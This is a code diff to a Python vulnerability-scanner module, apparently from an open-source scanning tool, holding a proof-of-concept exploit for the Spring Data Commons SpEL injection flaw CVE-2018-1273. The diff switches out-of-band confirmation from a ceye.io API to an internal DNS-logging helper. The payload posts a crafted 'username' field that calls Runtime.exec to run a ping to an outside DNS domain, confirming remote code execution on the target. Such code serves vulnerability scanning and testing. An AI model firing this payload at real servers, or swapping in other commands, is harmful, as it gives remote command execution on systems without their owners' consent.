@@ -1,27 +1,24 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 import time
-import requests
+from thirdparty import requests
 import threading
 from module import globals
 from core.verify import verify
-from module.md5 import random_md5
-from requests.packages import urllib3
-from requests_toolbelt.utils import dump
-urllib3.disable_warnings()
+from thirdparty.requests_toolbelt.utils import dump
+from module.api.dns import dns_result, dns_request
 
 
 class Spring():
     def __init__(self, url):
         self.url = url
+        if self.url[-1] == "/":
+            self.url = self.url[:-1]
         self.raw_data = None
         self.vul_info = {}
         self.ua = globals.get_value("UA")  # 获取全局变量UA
         self.timeout = globals.get_value("TIMEOUT")  # 获取全局变量UA
         self.headers = globals.get_value("HEADERS")  # 获取全局变量HEADERS
-        self.ceye_domain = globals.get_value("ceye_domain")
-        self.ceye_token = globals.get_value("ceye_token")
-        self.ceye_api = globals.get_value("ceye_api")
         self.threadLock = threading.Lock()
 
     def cve_2018_1273_poc(self):
@@ -43,20 +40,19 @@ class Spring():
                                     "攻击者可构造包含有恶意代码的SPEL表达式实现远程代码攻击，直接获取服务器控制权限。"
         self.vul_info["cre_date"] = "2021-01-26"
         self.vul_info["cre_auth"] = "zhzyker"
-        md = random_md5()[:-20]
-        cmd = "ping " + md + "." + self.ceye_domain
+        md = dns_request()
+        cmd = "ping " + md
         payload = 'username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("' + cmd + '")]=&password=&repeatedPassword='
         if r"users?page=&size=5" not in self.url:
             self.url = self.url + "/" + "users?page=&size=5"
         try:
             request = requests.post(self.url, data=payload, headers=self.headers, timeout=self.timeout, verify=False)
             time.sleep(0.5)
-            req = requests.get(self.ceye_api + self.ceye_token)
-            if md in req.text:
+            if dns_result(md):
                 self.vul_info["vul_data"] = dump.dump_all(request).decode('utf-8', 'ignore')
                 self.vul_info["prt_resu"] = "PoCSuCCeSS"
                 self.vul_info["vul_payd"] = payload
-                self.vul_info["prt_info"] = "[ceye] [rce] [payload: " + payload + " ]"
+                self.vul_info["prt_info"] = "[dns] [rce] [payload: " + payload + " ]"
             verify.scan_print(self.vul_info)
         except requests.exceptions.Timeout:
             verify.timeout_print(self.vul_info["prt_name"])
